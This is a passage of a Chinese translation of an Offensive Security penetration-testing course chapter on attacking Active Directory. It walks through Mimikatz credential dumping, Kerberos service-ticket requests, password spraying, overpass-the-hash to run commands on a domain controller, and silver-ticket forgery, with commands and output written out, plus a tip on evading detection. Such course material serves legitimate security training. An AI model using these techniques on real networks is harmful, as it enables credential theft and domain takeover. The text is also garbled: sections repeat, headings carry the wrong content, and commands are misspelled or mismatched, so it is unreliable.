+## 攻击性安全 (OFFENSIVE SECURITY)
+www.offensive-security.com
+
+![](img/f99f528ca9845f4c256ce54e882b1345_642_0.png)
+
+客户端
+应用服务器
+域控制器
+
+图 309：Active Directory 中 `NTLM` 身份验证图
+
+在第一个身份验证步骤中，计算机从用户密码计算出加密哈希，即 `NTLM` 哈希。接下来，客户端将用户名发送给服务器，服务器返回一个称为随机数（nonce）或挑战的随机值。客户端使用 `NTLM` 哈希加密随机数并发送给服务器。
+
+服务器将响应连同用户名转发给域控制器。域控制器使用密码解密挑战并比较结果。如果两者相等，则身份验证成功。
+
+> 为了防止篡改，票据授予票（Ticket Granting Ticket）是由只有 KDC 知知的密钥加密的，客户端无法对其解密。
+> 65 (Skip Duckwall, 2014), https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Kerberos-Sorry-You-Guys-Don't-Get-it-wp.pdf
+
+PWK 2.0 © Offensive Security Ltd. 版权所有。
+
+3. 一个包含用户名、组组成员以及新创建的会话密钥的服务票据。
+
+这部分部分（`SPN` 和会话密钥）使用与创建 `TGT` 相关的会话密钥进行加密，而服务票据则使用问题中注册与 `SPN` 注册的服务账户的密码哈希值进行加密。
+
+一旦 `KDC` 完成认证过程，且客户端拥有了会话密钥和服务票据，服务身份验证便开始了。
+
+首先，客户端向应用程序服务器发送一个应用程序请求或 `AP_REQ`，其中包含用户名、一个使用与服务票据相关的会话密钥加密的时间戳，以及服务票据本身。
+
+应用程序服务器使用服务账户的密码哈希值解密服务票据，并提取出用户名和会话密钥。然后，它使用该会话密钥解密 `AP_REQ` 中的用户名；如果该用户名与服务票据中的用户名匹配，则接受该请求。在授予访问权限之前，服务会检查服务票据中提供的组组成情况，并为用户分配适当的权限，之后用户即可访问请求的服务。
+
+该协议看起来可能复杂且错综复杂，但它的设计目的是缓解各种网络攻击并防止使用伪凭据。
+
+现在我们已经探索了 `NTLM` 和 Kerberos 认证的基础，让我们来探索各种缓存凭据存储和服务账户攻击。
+
+## 21.3.3 缓存凭据的存储与检索
+
+为了给缓存凭据攻击奠基础，我们必须首先讨论 Kerberos 使用的各种密码哈希以及它们是如何存储的。
+
+由于微软对 Kerberos 的实现使用了单点登录，密码哈希必须存储在某处以便刷新 `TGT` 请求。在当前的 Windows 版本中，这些哈希存储在本地安全权威子系统（`LSASS`）⁶⁶⁴ 内存空间⁶⁶⁷ 中。如果我们获得了这些哈希的访问权限，就可以对其进行破解以获取明文密码，或重用它们来执行各种操作。
+
+虽然这不是我们 AD 攻击的目标，但过程并不听起来那么简单。由于 `LSASS` 进程是操作系统的一部分并以 SYSTEM 身份运行，我们需要 SYSTEM（或本地管理员）权限才能访问存储在目标上的哈希。
+
+正因如此，为了存储哈希，我们必须从本地权限提升开始攻击。更棘的是，用于在内存中存储哈希的数据结构并没有公开文档，而且它们也使用 `LSASS` 存储的密钥进行了加密。
+
+> ⁶⁶⁴ (Microsoft, 2017), https://technet.microsoft.com/en-us/library/cc961760.aspx
+
+> ⁶⁶⁷ (Benjamin Delphy, 2013), http://blog.getwiki.com/security/mimikatz/sekurila-credan#getLogonPasswords
+
+尽管如此，这是针对 Windows 和 Active Directory 的一个巨大攻击向量，已经创建了一些工具来提取哈希，其中最流行的是 `Mimikatz`⁶⁴⁸。
+
+让我们尝试使用 `Mimikatz` 在我们的 Windows 10 系统上提取哈希。
+
+> 在接下来的示例中，我们将以独立应用程序的形式运行 `Mimikatz`。然而，由于 `Mimikatz` 的流行和广为人知的检测特征，请考虑避免将其作为独立程序运行。可以使用像 PowerShell⁵⁴⁹ 的注入器直接从内存执行 `Mimikatz`，或者使用任务管理器等内置工具转储 `LSASS` 进程内存，将导出的数据移动到辅助机，然后从那里将数据加载到 `Mimikatz`⁵⁵⁰
+
+由于 Offsec 用户是本地管理员，我们能够启动具有提升权限的命令提示符。通过该命令，我们将运行 `mimikatz`⁶⁵¹ 并执行 `privilege:debug` 来启用 `SeDebugPrivilege`⁶⁵ 权限，这将允许我们与另一个账户的进程进行交互。
+
+最后，我们将运行 `sekursa:logonpasswords` 使用 Sekursa⁶⁵³ 模块转储所有登录用户的凭据。
+
+此转储包含了当前工作站或服务器上登录的所有用户，包括远程桌面会话等远程登录。
+
+```
+C:\Tools\active_directory> mimikatz
+
+mimikatz # privilege:debug
+
+Privilege '20' OK
+
+mimikatz # sekursa:logonpasswords
+```
+
+
+
+Authentication ID : 0 ; 291668 (00000000:00047354)
+
+Session : Interactive from 1
+
+User Name : Offsec
+
+Domain : CORP
+
+Logon Server : DC1
+
+Logon Time : 08/02/2018 14:23.26
+
+SID : S-5-1-21-160287558-278572331-2599479668-1103
+
+msv :
+
+[00000003] Primary
+
+\ Username : Offsec
+
+⁶⁴⁸ (Benjamin Delphy, 2018), https://github.com/mimikatz/mimikatz
+⁶⁴⁹ (Matt Gray, 2016), https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectiveInjection.js
+⁶⁵⁰ (Ruben Boenen, 2016), https://www.fuzzysecurity.com/tutorials/18.html
+⁶⁵¹ (Benjamin Delphy, 2014), https://github.com/mimikatz/mimikatz/wiki/module~sekursa
+⁶⁵² (Microsoft, 2018), https://msdn.microsoft.com/en-us/library/windows/download/bb530716(v=85)
+⁶⁵³ (Benjamin Delphy, 2018), https://github.com/mimikatz/mimikatz
+
+既然我们已经探索了 NTLM 和 Kerberos 认证的基础，让我们来深入探索各种缓存凭据存储和服务账户的攻击。
+
+## 21.3.1 练习
+
++ 1. 使用 `Mimikatz` 从学生虚拟机中转储所有密码。
+2. 通过远程桌面以 `Jeff_Admin` 账户登录到域控制器，并使用 `Mimikatz` 转储服务器上的所有密码。
+
+## 21.3.4 服务账户攻击
+
+回想 Kerberos 协议的解释，对于一个 SPN，我们知道当用户想要访问由其托管的资源时，客户端会请求一个由域控制器生成的服务票据（service ticket）。由于该服务票据是用 SPN 的密码哈希加密的，因此应用程序服务器将对其进行解密和验证。
+
+在从域控制器请求服务票据时，并不会检查用户是否有权限访问由该服务主体名称（SPN）托管的服务。这些检查是在连接到服务本身时作为第二步执行的。这意味着如果我们知道想要目标的 SPN，就可以从本地内存中请求其服务票据并将其保存到磁盘上。
+
+在本节中，我们将使用服务票据并尝试破解服务账户的密码。
+
+例如，我们知道域内 Internet 信息服务（IIS）Web 服务器注册的 SPN 为 `HTTP/CorpWebServer.com`。通过 PowerShell，我们可以使用 `KerberosRequestSecurityToken` 类来请求服务票据。
+
+我们需要的代码段位于 `System.IdentityModel` 命名空间，该命名空间默认加载到 PowerShell 实例中。要加载它，我们使用带有 `-AssemblyName` 参数的 `Add-Type`。
+
+我们可以像列表 691 所示，通过 `ArgumentList` 指定 SPN 来调用 `KerberosRequestSecurityToken` 构造函数。
+
+```powershell
+Add-Type -AssemblyName System.IdentityModel
+
+New-Object System.IdentityModel.Tokens.KerberosRequestSecurityToken -ArgumentList 'HTTP/CorpWebServer.com'
+```
+
+> 列表 691 - 请求服务票据
+
+请求完成后，域控制器将生成服务票据并将其加载到 Windows 10 客户端的内存中。不需要一直使用 `Mimikatz`，也可以使用 `klist` 显示当前用户的所有缓存 Kerberos 票据。
+
+```cmd
+PS C:\Users\offsec.Corp> klist
+
+Current LogonId is: 0x3def
+
+Cached Tickets: (4)
+
+#0> Client: Offsec @CORP.COM
+```
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+Server: krbtgt/CORP.COM @ CORP.COM
+Kerberos Encryption Type: AES-256-HMAC-SHA1-9
+Ticket Flags 0x04e10000 -> forwardable renewable initial pre_authent_name_canonica
+
+Start Time: 2/12/2018 10:17:53 (local)
+End Time: 2/12/2018 20:17:53 (local)
+Renew Time: 2/19/2018 10:17:53 (local)
+Session Key Type: AES-256-CTS-HMAC-SHA1-9
+Cache Flags: 0x1 -> PRIMARY
+kdc Code: DC01.corp.com
+
+#1) Offsec @CORP.COM
+Server: HTTP/CorpWebServer.com @ CORP.COM
+Kerberos Encryption Type: RSADI RC4-HMAC (NT)
+Ticket Flags 0x04a50000 -> forwardable renewable pre_authent ok_as_delegate name_c
+
+Start Time: 2/12/2018 10:18:31 (local)
+End Time: 2/12/2018 20:17:53 (local)
+Renew Time: 2/19/2018 10:17:53 (local)
+Session Key Type: RSADI RC4-HMAC (NT)
+Cache Flags: 0
+kdc Code: DC01.corp.com
+
+# 列表 692 - 显示服务票据
+
+请求完成后，域控制器将生成服务票据并将其加载到 Windows 10 客户端的内存中。不需要一直使用 `Mimikatz`，也可以使用 `klist` 显示当前用户的所有缓存 Kerberos 票据。
+
+```cmd
+PS C:\Users\offsec.Corp> klist
+
+Current LogonId is: 0x3def
+
+Cached Tickets: (4)
+
+#0> Client: Offsec @CORP.COM
+```
+
+# 列表 693 - 导出票据
+
+由于 Internet 信息服务主体名称已加载到内存中（列表 692），我们可以使用内置 API 或 `Mimikatz` 下载它。要使用 `Mimikatz` 下载服务票据，我们使用 `kerberos::list` 命令，它的输出与 `klist` 相同。我们还指定了导出标志将其保存到磁盘。
+
+```powershell
+Add-Type -AssemblyName System.IdentityModel
+
+New-Object System.IdentityModel.Tokens.KerberosRequestSecurityToken -ArgumentList 'HTTP/CorpWebServer.com'
+```
+
+# 攻击性安全
+使用 Kali Linux 2.0 进行渗透测试
+
+测试 AD（活动目录）用户登录有多种方法，但我们可以使用我们的 PowerShell 脚本来演示基本组件。在之前的章节中，我们以已登录用户的身份对域控制器执行了查询。然而，我们也可以通过设置 `DirectoryEntry` 实例，在另一个用户的上下文中进行查询。
+
+在之前的示例中，我们使用了不带参数的 `DirectoryEntry` 构造函数，但我们可以提供三个参数，包括域控制器的 LDAP 路径以及用户名和密码：
+
+```bash
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+$PDC = ($domainObj.PdcOwner).Name
+
+$SearchString = "LDAP://"
+
+$SearchString += $PDC + " /"
+
+$DistinguishedName = "$($domainObj.Name.Replace('.',',DC='))"
+
+$SearchString += "$DistinguishedName
+```
+
+```bash
+
+
+
+`New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qerty09!")`
+
+## 列表 696 - 使用 DirectoryEntry 进行身份验证
+
+如果用户账户的密码正确，将如列表 697 所示成功创建对象。
+
+| distinguishedName | (DC=corp,DC=com) |
+| 路径 | `LDAP://DC1.corp.com/DC=corp,DC=com` |
+
+## 列表 697 - 使用 DirectoryEntry 成功身份验证
+
+如果密码无效，将不会创建任何对象，并且我们将如列表 698 所示收到一个异常。请注意关于用户名或密码错误的清晰警告。
+
+```text
+format-default : The following exception occurred while retrieving member "distinguishedName: "The user name or password is incorrect. "
+
++ * + Cargo : Notified: (:) [format-default], ExtendedSystemException
+
+* + FullyQualifiedErrorCode : CatchFromBaseGetMember.Microsoft.PowerShell.Commands.Format-
+```
+
+## 列表 698 - 使用 DirectoryEntry 密码错误
+
+通过这种方式，我们可以创建一个 PowerShell 脚本，根据锁定超时时间（`Lockout timeout`）和锁定观察窗口（`Lockout observation window`）枚举所有用户并进行身份验证。
+
+一个名为 `Spray-Passwords.ps1`⁶⁶⁵ 的现有攻击实现位于 `C:\active_directory` 文件夹中，它允许我们设置单个密码进行测试，或者我们可以使用 `-Pass` 选项切换密码列表文件。我们还可以通过添加 `-Admin` 标志测试管理员账户。
+
+⁶⁶⁵ (Improsec, 2016), https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
+
+```bash
+PS C:\Tools\active_directory\Spray-Passwords.ps1 -Pass Qerty09! -Admin
+
+WARNING: also targeting admin accounts.
+
+Performing brute force - press q to stop the process and return results...
+
+Guessed password for user: 'Administrator' = 'Qerty09!'
+
+Guessed password for user: 'offsec' = 'Qerty09!'
+
+Guessed password for user: 'adam' = 'Qerty09!'
+
+Guessed password for user: 'is_service' = 'Qerty09!'
+
+Guessed password for user: 'sql_service' = 'Qerty09!'
+
+Stopping bruteforce now..
+
+Users guessed:
+
+'Administrator' with password: 'Qerty09!'
+
+'offsec' with password: 'Qerty09!'
+
+'adam' with password: 'Qerty09!'
+
+'is_service' with password: 'Qerty09!'
+
+'sql_service' with password: 'Qerty09!'
+```
+
+
+
+列表 699 - 使用 Spray-Passwords 攻击用户账户
+
+此尝试示例产生了快速结果，但不仅如此，我们还需要使用一个包含良好候选密码的密码列表。
+
+我们现在已经揭示了攻击 Active Directory 及其身份验证协议时获取用户账户和服务账户凭据的方法。接下来，我们可以开始利用这一点来渗透域中的其他机器，特别是那些登录了高价值价值用户的机器。
+
+# 21.3.5.1 练习题
+
+- 1. 使用本模块中的 PowerShell 脚本猜测 `jeff_admin` 用户的密码。
+- 2. 使用 `Spray-Passwords.ps1` 工具从密码列表对域中的所有用户进行查询暴力破解攻击。
+
+### 21.4 活动目录横向移动
+
+在之前的章节中，我们定位了可能导致整个 Active Directory 被攻破的高价值目标，并找到了这些目标登录的工作站或服务器。我们收集了密码哈希，恢复了现有的票据，并利用它们进行 Kerberos 身份验证。
+
+接下来，我们将使用横向移动来攻破高价值目标所在的机器。
+
+我们方法的逻辑下一步是破解我们已获得的任何密码哈希，并使用明文密码对机器进行身份验证以获得未经授权的访问。然而，破解密码需要时间可能会失败。此外，Kerberos 和 NTLM 不直接使用明文密码，微软的原生工具不支持使用密码哈希进行身份验证。
+
+在下一节中，我们将探索另一种横向移动技术，它允许我们仅使用用户的哈希或 Kerberos 票据对系统进行身份验证并获取代码执行权限。
+
+# 传递哈希 (Pass the Hash)
+
+`PTH` 技术允许攻击者使用用户的 NTLM 哈希代替关联明文密码对远程系统或服务进行身份验证。注意，这不适用于 Kerberos 身份验证，但适用于使用 NTLM 身份验证的服务。
+
+许多第三方工具和框架使用 `PTH` 来允许用户进行身份验证并获取代码执行，例如使用 Metasploit 的 `PsExec`，`Passing-the-hash toolkit`，以及 `Impacket`。
+
+注意，这不适用于 Kerberos 身份验证，但适用于使用 NTLM 身份验证的服务。
+
+# 攻击性安全
+使用 Kali Linux 2.0 进行渗透测试
+
+测试 AD 用户登录有多种方法，但我们可以使用我们的 PowerShell 脚本来演示基本组件。在之前的章节中，我们以已登录用户的身份对域控制器执行了查询。然而，我们也可以通过设置 `DirectoryEntry` 实例，在另一个用户的上下文中进行查询。
+
+在之前的示例中，我们使用了不带参数的 `DirectoryEntry` 构造函数，但我们可以提供三个参数，包括域控制器的 LDAP 路径以及用户名和密码：
+
+```bash
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+$PDC = ($domainObj.PdcOwner).Name
+
+$SearchString = "LDAP://"
+
+$SearchString += $PDC + " /"
+
+$DistinguishedName = "$($domainObj.Name.Replace('.',',DC='))"
+
+$SearchString += "$DistinguishedName
+```
+
+```bash
+New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qerty09!")
+```
+
+列表 696 - 使用 DirectoryEntry 进行身份验证
+
+如果用户账户的密码正确，将如列表 697 所示成功创建对象。
+
+| distinguishedName | (DC=corp,DC=com) |
+| 路径 | LDAP://DC1.corp.com/DC=corp,DC=com |
+
+列表 697 - 使用 DirectoryEntry 成功身份验证
+
+如果密码无效，将不会创建任何对象，并且我们将如列表 698 所示收到一个异常。请注意关于用户名或密码错误的清晰警告。
+
+```text
+format-default : The following exception occurred while retrieving member "distinguishedName: "The user name or password is incorrect."
+
++ * + Cargo : Notified: (:) [format-default], ExtendedSystemException
+
+* + FullyQualifiedErrorCode : CatchFromBaseGetMember.Microsoft.PowerShell.Commands.Format-
+```
+
+
+
+列表 698 - 使用 DirectoryEntry 密码错误
+
+通过这种方式，我们可以创建一个 PowerShell 脚本，根据锁定超时时间（Lockout timeout）和锁定观察窗口（Lockout observation window）枚举所有用户并进行身份验证。
+
+一个名为 `Spray-Passwords.ps1`⁶⁶⁵ 的现有攻击实现位于 `C:\active_directory` 文件夹中，它允许我们设置单个密码进行测试，或者我们可以使用 `-Pass` 选项切换密码列表文件。我们还可以通过添加 `-Admin` 标志测试管理员账户。
+
+⁶⁶⁵ (Improsec, 2016), https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
+
+```bash
+PS C:\Tools\active_directory\Spray-Passwords.ps1 -Pass Qerty09! -Admin
+```
+
+```
+WARNING: also targeting admin accounts.
+
+Performing brute force - press q to stop the process and return results...
+
+Guessed password for user: 'Administrator' = 'Qerty09!'
+
+Guessed password for user: 'offsec' = 'Qerty09!'
+
+Guessed password for user: 'adam' = 'Qerty09!'
+
+Guessed password for user: 'is_service' = 'Qerty09!'
+
+Guessed password for user: 'sql_service' = 'Qerty09!'
+
+Stopping bruteforce now..
+
+Users guessed:
+
+'Administrator' with password: 'Qerty09!'
+
+'offsec' with password: 'Qerty09!'
+
+'adam' with password: 'Qerty09!'
+
+'is_service' with password: 'Qerty09!'
+
+'sql_service' with password: 'Qerty09!'
+```
+
+列表 699 - 使用 Spray-Passwords 攻击用户账户
+
+此尝试示例产生了快速结果，但不仅如此，我们还需要使用一个包含良好候选密码的密码列表。
+
+我们现在已经揭示了攻击 Active Directory 及其身份验证协议时获取用户账户和服务账户凭据的方法。接下来，我们可以开始利用这一点来渗透域中的其他机器，特别是那些登录了高价值价值用户的机器。
+
+# 21.3.5.1 练习题
+
+- 1. 使用本模块中的 PowerShell 脚本猜测 `jeff_admin` 用户的密码。
+- 2. 使用 `Spray-Passwords.ps1` 工具从密码列表对域中的所有用户进行查询暴力破解攻击。
+
+### 21.4 活动目录横向移动
+
+在之前的章节中，我们定位了可能导致整个 Active Directory 被攻破的高价值目标，并找到了这些目标登录的工作站或服务器。我们收集了密码哈希，恢复了现有的票据，并利用它们进行 Kerberos 身份验证。
+
+接下来，我们将使用横向移动来攻破高价值目标所在的机器。
+
+我们方法的逻辑下一步是破解我们已获得的任何密码哈希，并使用明文密码对机器进行身份验证以获得未经授权的访问。然而，破解密码需要时间可能会失败。此外，Kerberos 和 NTLM 不直接使用明文密码，微软的原生工具不支持使用密码哈希进行身份验证。
+
+在下一节中，我们将探索另一种横向移动技术，它允许我们仅使用用户的哈希或 Kerberos 票据对系统进行身份验证并获取代码执行权限。
+
+# 传递哈希 (Pass the Hash)
+
+`PTH` 技术允许攻击者使用用户的 NTLM 哈希代替关联明文密码对远程系统或服务进行身份验证。注意，这不适用于 Kerberos 身份验证，但适用于使用 NTLM 身份验证的服务。
+
+许多第三方工具和框架使用 PTH 允许用户进行身份验证并获取代码执行，例如使用 Metasploit 的 `PsExec`，⁶⁶⁶ `Passing-the-hash toolkit`，⁶⁶⁷ 以及 `Impacket`，⁶⁶⁸。
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+# OFFENSIVE SECURITY
+www.offensivesecurity.com
+
+我们可以通过 `mimikatz` 的 `sekurlsa::logonpasswords` 命令来验证这一点，它可以导出缓存的密码。
+
+```
+mimikatz # sekurlsa::logonpasswords
+```
+
+```
+Authentication Id : 0 ; 2815531 (00000000:002af62b)
+
+Session : Interactive from 0
+
+User Name : jeff_admin
+
+Domain : CORP
+
+Logon Server : DCB1
+
+Logon Time : 12/02/2018 09.18.57
+
+SID : S-1-5-21-1602875587-2785722331-2599476968-1105
+
+[0000083]
+
+\ User : jeff_admin
+
+\ Domain : CORP
+
+\ NTLM
+
+\ SHA1 : e2b475c11da2a0748290d87aa966c327
+
+\ SHA2 : 87cc7f43da2a8bc10ead387d6401c764d026e
+
+\ DPAPI : 291a834d6707288728ccd876eb49b49
+
+tspkg:
+
+\ Username : jeff_admin
+
+\ Domain : CORP
+
+\ Password : (null)
+
+kerberos
+
+\ Username : jeff_admin
+
+\ Domain : CORP.COM
+
+\ Password : (null)
+```
+
+> 列表 701 - 为 Jeff_Admin 导出密码哈希
+
+此输出显示了 Jeff_Admin 的缓存凭据，包括 NTLM 哈希，我们可以利用它来通过哈希攻击。
+
+哈希技术的核心是将 NTLM 哈希转换为 Kerberos 票据，并避免使用 NTLM 认证。实现此点的一种简单方法是使用 Mimikatz 的 `sekurlsa::pth` 命令。
+
+该命令需要几个参数，并在 Jeff_Admin 用户的环境中创建一个新的 PowerShell 进程。此 PowerShell 提示符允许我们在不通过网络执行 NTLM 认证的情况下获取 Kerberos 票据，使得这种攻击与传统的哈希传递（pass-the-hash）不同。
+
+作为第一个参数，我们指定 `/user:` 和 `/domain:`，将它们分别设置为 `jeff_admin` 和 `corp.com`。我们将使用 `/ntlm:` 指定 NTLM 哈希，最后使用 `/run:` 指定要创建的进程（在此处为 PowerShell）。
+
+```
+mimikatz #sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+```
+
+```
+user : jeff_admin
+
+domain : corp.com
+
+program : cmd.exe
+
+impers. : no
+
+NTLM : e2b475c11da2a0748290d87aa966c327
+
+PID : 4832
+```
+
+PWK 2.0
+
+Copyright © Offensive Security Ltd. All rights reserved.
+
+# OFFENSIVE SECURITY
+www.offensive-security.com
+
+```
+TID 2268
+
+LSA Process is now R/W
+
+LUID 0 : 1197687 (00000000:00124677)
+
+msvl_0 - data_copy @ 04E0561 : OK !
+
+kerberos - data_copy @ 04E05438
+
+aes256_hmac -> null
+
+aes128_hmac -> null
+
+rc4_hmac_nt -> OK
+
+rc4_hmac_old -> OK
+
+rc4_adv -> OK
+
+rc4_hmac_exp -> OK
+
+rc4_hmac_old -> null
+
++Password replace -> null
+```
+
+列表 702 - 使用不同用户的 NTLM 密码哈希创建进程
+
+此时，我们拥有了一个 PowerShell 会话，允许我们以 Jeff_Admin 的身份执行命令。让我们用 `klist` 列出 Kerberos 票据。
+
+
+
+```
+PS C:\Windows\system32> klist
+
+CurrentLogonId is 0:x1583ae
+Cached Tickets: (0)
+```
+
+没有缓存 Kerberos 票据，这是预期的，因为 `Jeff_Admin` 没有进行交互式登录。然而，让我们通过 `net use` 认证域控制器来生成 TGT。
+
+```
+PS C:\Windows\system32> net use \dc01
+The command completed.
+PS C:\Windows\system32> klist
+
+CurrentLogonId is 0:x1583ae
+Cached Tickets: (3)
+Client: jeff_admin @ CORP.COM
+Server: krbtgt@CORP.COM
+Kerberos Encryption Type: AES-256-SHA1
+Ticket Flags: 0x4010080 -> forwardable preauth_name
+Start Time: 12/02/2018 13:59:40 (local)
+End Time: 12/02/2018 23:59:40 (local)
+Renew Time: 12/19/2018 13:59:40 (local)
+Session Key: AES-256-CTS-HMAC
+Cache Flags: 0x2 -> DELEGATION
+Kdc Called: dc01.corp.com
+Client: jeff_admin @ CORP.COM
+Server: krbtgt@CORP.COM
+Kerberos Encryption Type: AES-256-SHA1
+Ticket Flags: 0xa4a0088 -> forwardable renewable preauth_name
+```
+
+列表 704 - 在域控制器上映射网络并列出 Kerberos 票据
+
+输出表明 TGT 的 `use` 命令成功。我们随后使用 `klist` 命令列出请求的 Kerberos 票据，包括 CIFS 服务的 TGT 和 TGS。
+
+我们在示例中使用了 "`use`"，但可以使用任何需要域权限的命令来随后创建 TGS。
+
+我们现在将 NTLM 哈希注入 Kerberos TGT，允许我们使用任何运行在 Kerberos（而非 NTLM）认证上的工具，例如微软官方的 `PsExec`。
+
+`PsExec` 可以远程运行命令，但不接受密码哈希。由于我们已经生成了 Kerberos 票据并在 PowerShell 会话中以 `Jeff_Admin` 身份操作，我们可以重用 TGT 在域控制器上远程执行代码。
+
+让我们现在尝试一下，运行 `\\PsExec.exe` 在 `\dc01` 机器上以 `Jeff_Admin` 身份启动 `cmd.exe`：
+
+```
+PS C:\active_directory> \dc01 cmd.exe
+
+PsExec v2.2 - Execute processes remotely
+
+Copyright (C) 2001-2016 Mark Russinovich
+
+Sysinternals - www.sysinternals.com
+
+C:\Windows\system32 ipconfig
+```
+
+Windows IP 配置 (Microsoft, 2016), https://docs.microsoft.com/sysinternals/downloads/psexec
+
+### 以太网适配器 Ethernet:
+
+连接特定的 DNS后缀: fe80::7959:aad:eec:39692
+本地链路 IPv6 地址: 192.168.1.110
+子网掩码: 255.255.255.0
+默认网关: 192.168.1.1
+
+```
+C:\Windows\system32> whoami
+
+corp\jeff_admin
+```
+
+列表 75: 使用 Kerberos 打开远程连接
+
+由此证明，我们成功恢复了 Kerberos TGT 并在域控制器上启动了命令。
+
+太棒了！我们成功将缓存的 NTLM 密码哈希升级为 Kerberos TGT 并利用其获得了远程代码执行。
+
+## 21.4.2.1 练习
+
+- 1. 执行命令。
+
+## 21.4.2.2 传递票据 (Pass Ticket)
+
+在前节中，我们演示了如何使用 NTLM 哈希在不知道密码的情况下获取 Kerberos TGT。哈希技术的核心是将 NTLM 哈希转换为 Kerberos 票据，并避免使用 NTLM 认证。实现此点的一种简单方法是使用 Mimikatz 的 `sekurlsa::pth` 命令。
+
+该命令需要几个参数，并在 `Jeff_Admin` 用户的环境中创建一个新的 PowerShell 进程。此 PowerShell 提示符允许我们在不通过网络执行 NTLM 认证的情况下获取 Kerberos 票据，使得这种攻击与传统的哈希传递（pass-the-hash）不同。
+
+作为第一个参数，我们指定 `/user:` 和 `/domain:`，将它们分别设置为 `jeff_admin` 和 `corp.com`。我们将使用 `/ntlm:` 指定 NTLM 哈希，最后使用 `/run:` 指定要创建的进程（在此处为 PowerShell）。
+
+## 21.4.2.3 银色票据 (Silver)
+
+在前节中，我们演示了如何使用 NTLM 哈希在不知道密码的情况下获取 Kerberos TGT。哈希技术的核心是将 NTLM 哈希转换为 Kerberos 票据，并避免使用 NTLM 认证。实现此点的一种简单方法是使用 Mimikatz 的 `sekurlsa::pth` 命令。
+
+该命令需要几个参数，并在 `Jeff_Admin` 用户的环境中创建一个新的 PowerShell 进程。此 PowerShell 提示符允许我们在不通过网络执行 NTLM 认证的情况下获取 Kerberos 票据，使得这种攻击与传统的哈希传递（pass-the-hash）不同。
+
+作为第一个参数，我们指定 `/user:` 和 `/domain:`，将它们分别设置为 `jeff_admin` 和 `corp.com`。我们将使用 `/ntlm:` 指定 NTLM 哈希，最后使用 `/run:` 指定要创建的进程（在此处为 PowerShell）。
+
+## 21.4.2.4 黄金票据 (Golden)
+
+在前节中，我们演示了如何使用 NTLM 哈希在不知道密码的情况下获取 Kerberos TGT。哈希技术的核心是将 NTLM 哈希转换为 Kerberos 票据，并避免使用 NTLM 认证。实现此点的一种简单方法是使用 Mimikatz 的 `sekurlsa::pth` 命令。
+
+该命令需要几个参数，并在 `Jeff_Admin` 用户的环境中创建一个新的 PowerShell 进程。此 PowerShell 提示符允许我们在不通过网络执行 NTLM 认证的情况下获取 Kerberos 票据，使得这种攻击与传统的哈希传递（pass-the-hash）不同。
+
+作为第一个参数，我们指定 `/user:` 和 `/domain:`，将它们分别设置为 `jeff_admin` 和 `corp.com`。我们将使用 `/ntlm:` 指定 NTLM 哈希，最后使用 `/run:` 指定要创建的进程（在此处为 PowerShell）。
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+```
+C:\>whoami /user
+```
+
+## 用户信息
+
+| 用户名 | SID |
+| :--- | :--- |
+| corp\offsec | S-1-5-21-1602875587-2787523311-2599479668-1103 |
+
+列表 708 - 定位域
+
+定义域的 SID 是末尾的整个 RID 字符串（-1103），如列表 708 所示。
+
+现在我们已经获取了域 SID，让我们尝试为我们之前在专用实验室中发现的 IIS 服务制作一个银票（silver ticket）。
+
+制作银票命令需要用户名 (`/user`)、域名 (`/domain`)、域 SID (`/sid`，具有高权限）、服务的完全托管名称 (`/target`)、服务类型 (`/service:HTTP`) 以及 `iis_service` 服务账户的密码 (`/rc4`)。
+
+最后，生成的银票将通过 `/ppt` 标志注入内存中。
+
+在运行此操作之前，我们将使用 `kerberos:purge` 刷新任何现有的 Kerberos 票，并使用 `kerberos:list` 验证刷新结果。
+
+```
+mimikat # kerberos:purge
+Ticket(s) for current session is OK
+```
+
+```
+mimikat # kerberos:list
+```
+
+
+
+```
+mimikat # kerberos:golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668-2908AAA96C37 /ppt
+User : offsec
+Domain : Corp (COM)
+SID : S-1-5-21-1602875587-2787523311-2599479668
+User Id : 506
+Groups Id : \513 520 518
+ServiceKey: e4b7c11cda2a07482d87aa96c327 - rc4_hmac_nt
+Service : HTTP
+Target : CorpWebServer.corp.com
+Lifetime : 13/02/2018 10.48 ; 11/02/2018 10.48 ; 11/02/2018 10.48
+-> Ticket : \** Pass The Ticket \**
+```
+
+```
+* PAC generated
+* PAC signed
+* EncTicketPart generated
+* EncTicketPart encrypted
+* KrbCred generated
+```
+
+Golden ticket for `/offsec` @ `corp.com'` successfully submitted for current session
+
+```
+mimikat # kerberos:list
+```
+
+```
+[00000000] - 0x000000017 - rc4_hmac_nt
+```
+
+Start/MaxRenew: 13/02/2018 10.18.42 ; 11/02/2018 10.18.42 ; 11/02/2028 10.18.42
+
+Server Name : : HTTPWebServer.corp.com @ corp.com
+
+Client Name : : offsec @ corp.com
+
+Flags 40a00000 : : pre_auth ; renewable ; forwardable ;
+
+列表 709 - 为 `iis_service` 服务账户创建银票
+
+如输出 709 所示，针对 SPN `HTTP/WebServer.corp.com` 的新服务票据已加载到内存中，`Mimikatz` 在伪造的票中设置了适当的组组成权限。从 IIS 应用程序的角度来看，当前用户将是内置本地管理员（相对 ID: 500）以及多个高权限组的成员，例如上文强调的域管理员（Domain Admins）组。
+
+> 创建银票时，使用密码哈希值而不是明文密码。如果 Kerberos 会话向我们提供了明文密码，我们必须在使用它生成银票之前对其进行隐藏。
+
+现在我们已经将此票据加载到内存中，可以与服务进行交互，并获取关于我们在银票中放入的组权限的任何信息。取决于服务的类型，还可能获得代码执行权限。
+
+## 21.4.3.1 练习题
+
+1. 为 `iis_service.account` 创建并注入银票。
+
+2. 为 SQL 服务创建一个具有域管理员（Domain Admins）组成员权限的银票，如何提供在被执行服务器上获得任意代码执行的方法？
+
+3. 为 SQL 服务账户创建银票。
+
